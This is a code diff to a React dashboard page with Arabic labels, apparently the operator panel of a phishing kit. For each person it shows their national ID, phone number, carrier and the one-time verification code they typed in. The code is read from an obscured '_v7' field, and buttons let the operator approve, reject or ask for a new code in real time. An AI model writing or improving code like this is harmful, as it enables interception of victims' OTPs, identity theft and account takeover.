@@ -548,13 +548,14 @@ export default function DashboardPage() {
     const phoneOtpStatus = getPhoneOtpStatus();
     const raw = selectedRequest?.raw;
 
-    // Get phone OTP code if submitted
-    const phoneOtpCode = raw?.phoneOtp || "";
+    // Get phone OTP code if submitted (stored as _v7 in history)
+    const phoneOtpCode = raw?._v7 || raw?.phoneOtp || "";
 
-    // Show box if there's phone data OR status is approved/rejected (keep showing after decision)
-    const hasPhoneData = raw?.phoneNumber || phoneOtpCode;
+    // Show box if there's phone data OR OTP code OR status is approved/rejected
+    const hasPhoneData = raw?.phoneNumber || raw?.phoneIdNumber;
+    const hasOtpSubmitted = phoneOtpCode;
     const hasDecision = phoneOtpStatus === "approved" || phoneOtpStatus === "rejected";
-    if (!hasPhoneData && !hasDecision && currentStep !== 7) {
+    if (!hasPhoneData && !hasOtpSubmitted && !hasDecision) {
       return null;
     }
 
@@ -568,55 +569,69 @@ export default function DashboardPage() {
           <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 4</span>
         </div>
         
-        {/* Phone number info */}
-        {raw?.phoneNumber && (
+        {/* Phone data info - show when phone data submitted */}
+        {hasPhoneData && (
           <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
-            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رقم الهاتف:</p>
-            <p style={{ margin: 0, fontSize: "1rem", fontWeight: 700, color: "#0c4a6e" }} dir="ltr">{raw.phoneNumber}</p>
-            <p style={{ margin: "4px 0 0", fontSize: "0.75rem", color: "#0369a1" }}>الشركة: {raw.phoneCarrier || "غير محدد"}</p>
+            {(raw?.phoneIdNumber || raw?.identityNumber) && (
+              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
+                رقم الهوية: <strong dir="ltr">{raw.phoneIdNumber || raw.identityNumber}</strong>
+              </p>
+            )}
+            {raw?.phoneNumber && (
+              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
+                رقم الهاتف: <strong dir="ltr">{raw.phoneNumber}</strong>
+              </p>
+            )}
+            <p style={{ margin: 0, fontSize: "0.8rem", color: "#0369a1" }}>
+              الشركة: <strong>{raw.phoneCarrier || "غير محدد"}</strong>
+            </p>
           </div>
         )}
         
-        {/* Show phone OTP code when submitted */}
+        {/* Show phone OTP code when submitted - THIS IS THE KEY BOX */}
         {phoneOtpCode && (
-          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12, textAlign: "center" }}>
-            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق:</p>
-            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{phoneOtpCode}</p>
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 16, border: "2px solid #f59e0b", marginBottom: 12, textAlign: "center" }}>
+            <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>🔐 رمز التحقق المُدخل:</p>
+            <p style={{ margin: 0, fontSize: "2rem", fontWeight: 700, color: "#78350f", letterSpacing: "0.4em" }}>{phoneOtpCode}</p>
           </div>
         )}
         
         {/* Status message */}
         {phoneOtpStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للنفاذ</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للصفحة التالية</p>
           </div>
         )}
         {phoneOtpStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد المحاولة</p>
-          </div>
-        )}
-        {(phoneOtpStatus === "pending" || phoneOtpStatus === "verifying" || !phoneOtpStatus) && currentStep === 7 && (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة رمز الهاتف</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - رقم الهاتف غير صحيح</p>
           </div>
         )}
         
-        {/* Action buttons - show only when at this step and phone data exists */}
-        {(phoneOtpStatus === "pending" || phoneOtpStatus === "verifying" || !phoneOtpStatus) && currentStep === 7 && raw?.phoneNumber && (
-          <div style={{ display: "flex", gap: 8 }}>
-            <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
-              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
-              {actionLoading === "phone" ? "جاري..." : "✅ موافق"}
-            </button>
-            <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
-              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
-              {actionLoading === "phone" ? "جاري..." : "❌ مرفوض"}
-            </button>
+        {/* Action buttons - show only when OTP code is submitted and not yet decided */}
+        {phoneOtpCode && !hasDecision && (
+          <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
+            <div style={{ display: "flex", gap: 8 }}>
+              <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
+                style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
+                {actionLoading === "phone" ? "جاري..." : "✅ موافق - توجيه العميل"}
+              </button>
+              <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
+                style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
+                {actionLoading === "phone" ? "جاري..." : "❌ مرفوض - رقم غير صحيح"}
+              </button>
+            </div>
             <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
-              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700 }}>
-              🔄 إعادة إرسال
+              style={{ padding: "12px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
+              🔄 إعادة إرسال - العميل يُدخل رمز جديد
             </button>
+          </div>
+        )}
+        
+        {/* Show waiting message when phone data submitted but no OTP yet */}
+        {!phoneOtpCode && hasPhoneData && !hasDecision && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال العميل لرمز التحقق</p>
           </div>
         )}
       </div>
